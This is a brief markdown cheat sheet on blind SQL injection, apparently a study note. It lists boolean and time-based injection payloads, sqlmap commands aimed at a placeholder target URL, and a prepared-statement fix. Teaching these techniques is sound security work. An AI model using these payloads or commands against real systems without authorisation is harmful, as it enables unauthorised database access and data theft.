# SQL Injection (Blind) - Time-Based & Boolean Detection

## 🎯 Blind SQLi Overview
Blind SQLi occurs when no database errors or output are visible. Attacker infers information from application behavior differences.

## 🔬 Detection Techniques

### Boolean-Based
```sql
' AND 1=1 --  (TRUE condition)
' AND 1=2 --  (FALSE condition)
```
Response patterns indicate vulnerability if behavior differs.

### Time-Based
```sql
' AND IF(1=1, SLEEP(5), 0) --  (5 second delay if TRUE)
' AND IF(1=2, SLEEP(5), 0) --  (Immediate if FALSE)
```

## 🛠️ Exploitation Tools

### sqlmap Blind Testing
```bash
sqlmap -u "http://target.com/vuln?id=1" --technique=B  # Boolean
sqlmap -u "http://target.com/vuln?id=1" --technique=T  # Time-based
```

### Data Extraction Methods
- **Binary search:** Character by character extraction
- **Bitwise extraction:** Bit manipulation for faster extraction

## 🛡️ Prevention
Same as regular SQLi: **prepared statements mandatory**
```php
$stmt = $pdo->prepare("SELECT * FROM table WHERE id = ?");
$stmt->execute([$user_input]);
```

## 📚 Resources
- **PortSwigger:** Comprehensive blind SQLi guides
- **OWASP:** Testing methodology for blind injections

---

**Blind SQLi stealthy tapi powerful.** Patience required - automated tools essential for efficiency. 🕒🔍
